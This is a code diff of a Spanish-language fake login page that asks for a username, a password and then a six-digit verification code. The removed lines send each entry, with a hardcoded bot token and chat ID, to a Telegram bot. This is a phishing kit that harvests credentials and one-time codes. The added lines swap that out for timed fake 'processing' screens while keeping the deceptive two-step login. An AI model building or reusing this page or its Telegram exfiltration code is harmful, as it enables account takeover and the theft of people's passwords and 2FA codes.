@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar Sesión</title>
+    <title>Ingreso al Sistema</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f4f8;
+            background-color: #001f3f; /* Azul Marino */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,30 +15,31 @@
             margin: 0;
         }
         .container {
-            background-color: #ffffff;
+            background-color: #ffffff; /* Blanco */
             padding: 35px 25px;
             border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 40, 100, 0.08);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
             width: 100%;
             max-width: 360px;
             box-sizing: border-box;
-            border-top: 5px solid #0056b3;
+            border-top: 5px solid #001122;
+            text-align: center;
         }
         h2 {
             margin-top: 0;
-            color: #003366;
-            text-align: center;
+            color: #001f3f; /* Azul Marino */
             font-size: 22px;
             margin-bottom: 25px;
         }
         .input-group {
             position: relative;
             margin-bottom: 20px;
+            text-align: left;
         }
         label {
             display: block;
             margin-bottom: 6px;
-            color: #4a5568;
+            color: #001f3f;
             font-size: 14px;
             font-weight: 500;
         }
@@ -50,18 +51,19 @@
             box-sizing: border-box;
             font-size: 16px;
             background-color: #f8fafc;
-            color: #334155;
+            color: #1e293b;
             transition: border-color 0.2s;
         }
         input:focus {
             outline: none;
-            border-color: #0056b3;
+            border-color: #001f3f;
             background-color: #ffffff;
         }
         .password-wrapper {
             position: relative;
             display: flex;
             align-items: center;
+            width: 100%;
         }
         .toggle-password {
             position: absolute;
@@ -74,8 +76,8 @@
         button {
             width: 100%;
             padding: 14px;
-            background-color: #0056b3;
-            color: white;
+            background-color: #001f3f; /* Azul Marino */
+            color: white; /* Blanco */
             border: none;
             border-radius: 6px;
             font-size: 16px;
@@ -85,7 +87,7 @@
             margin-top: 10px;
         }
         button:hover {
-            background-color: #004085;
+            background-color: #001122;
         }
         button:disabled {
             background-color: #94a3b8;
@@ -100,19 +102,55 @@
         .instruction-text {
             color: #64748b;
             font-size: 14px;
-            text-align: center;
             line-height: 1.5;
             margin-bottom: 20px;
         }
-        .timer {
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-            color: #dc2626;
-            margin-top: 15px;
-            background-color: #fee2e2;
-            padding: 8px;
-            border-radius: 6px;
+
+        /* --- ANIMACIONES --- */
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #001f3f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .clock-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            border: 4px solid #001f3f;
+            border-radius: 50%;
+            margin: 20px auto;
+            background-color: #ffffff;
+        }
+        .clock-hand {
+            position: absolute;
+            width: 4px;
+            background-color: #001f3f;
+            border-radius: 2px;
+            transform-origin: bottom center;
+            left: calc(50% - 2px);
+        }
+        .hour-hand {
+            height: 14px;
+            top: 16px;
+            animation: rotateHand 12s linear infinite;
+        }
+        .minute-hand {
+            height: 20px;
+            top: 10px;
+            animation: rotateHand 1s linear infinite;
+        }
+        @keyframes rotateHand {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -147,21 +185,34 @@
         
         <form id="codeForm">
             <div class="input-group">
-                <input type="text" id="codigoVerificacion" maxlength="6" pattern="\d{6}" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 8px;">
+                <input type="text" id="codigoVerificacion" inputmode="numeric" pattern="\d*" maxlength="6" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 8px;">
             </div>
             
             <button type="submit" id="btnFinalizar">Verificar</button>
         </form>
-        
-        <div class="timer" id="countdown">10:00</div>
+    </div>
+
+    <!-- PASO DE CARGA INTERMEDIO (5 SEGUNDOS) -->
+    <div id="stepLoading" class="step">
+        <h2>Procesando</h2>
+        <p class="instruction-text">Validando el código de seguridad introducido...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- PASO FIN: ESTADO FINAL -->
+    <div id="stepFinal" class="step">
+        <h2>Estado del Proceso</h2>
+        <div class="clock-container">
+            <div class="clock-hand hour-hand"></div>
+            <div class="clock-hand minute-hand"></div>
+        </div>
+        <p class="instruction-text" style="font-weight: 500; color: #001f3f; font-size: 16px; margin-top: 20px;">
+            La verificación está en proceso.
+        </p>
     </div>
 </div>
 
 <script>
-    // Credenciales fijadas correctamente
-    const TELEGRAM_TOKEN = '9100194804:AAEx5kItgP_Mq6RHWkl8mJKbcw5Wg6FV3Bc'; 
-    const CHAT_ID = '8885271470'; 
-
     const contrasenaInput = document.getElementById('contrasena');
     const eyeIcon = document.getElementById('eyeIcon');
 
@@ -175,97 +226,33 @@
         }
     });
 
-    // Envío del Paso 1 (Usuario y Clave)
+    // Manejo del Envío del Paso 1 (Usuario y Clave)
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        const usuario = document.getElementById('usuario').value;
-        const contrasena = document.getElementById('contrasena').value;
         const btn = document.getElementById('btnSiguiente');
-
         btn.disabled = true;
         btn.innerText = 'Cargando...';
 
-        const textoTelegram = '🔐 *Datos Recibidos*\n\n👤 *Usuario:* ' + usuario + '\n🔑 *Clave:* ' + contrasena;
-        
-        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
-        const urlPaso1 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
-
-        fetch(urlPaso1, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: textoTelegram,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Error en la API');
+        setTimeout(() => {
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            startTimer(600); 
-        })
-        .catch(err => {
-            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
-            btn.disabled = false;
-            btn.innerText = 'Siguiente';
-        });
+        }, 800);
     });
 
-    // Envío del Paso 2 (Código de Verificación)
+    // Manejo del Envío del Paso 2 (Código de Verificación)
     document.getElementById('codeForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const codigo = document.getElementById('codigoVerificacion').value;
-        const btn = document.getElementById('btnFinalizar');
-
-        btn.disabled = true;
-        btn.innerText = 'Procesando...';
-
-        const textoTelegramCodigo = '🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ' + codigo;
         
-        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
-        const urlPaso2 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('stepLoading').classList.add('active');
 
-        fetch(urlPaso2, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: textoTelegramCodigo,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Error en la API');
-            alert('Verificación completada con éxito.');
-        })
-        .catch(() => {
-            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
-            btn.disabled = false;
-            btn.innerText = 'Verificar';
-        });
+        // Espera de 5 segundos antes de la pantalla final
+        setTimeout(() => {
+            document.getElementById('stepLoading').classList.remove('active');
+            document.getElementById('stepFinal').classList.add('active');
+        }, 5000);
     });
-
-    function startTimer(duration) {
-        let timer = duration, minutes, seconds;
-        const display = document.getElementById('countdown');
-        
-        const interval = setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            display.textContent = minutes + ":" + seconds;
-
-            if (--timer < 0) {
-                clearInterval(interval);
-                display.textContent = "Expirado";
-            }
-        }, 1000);
-    }
 </script>
 
 </body>
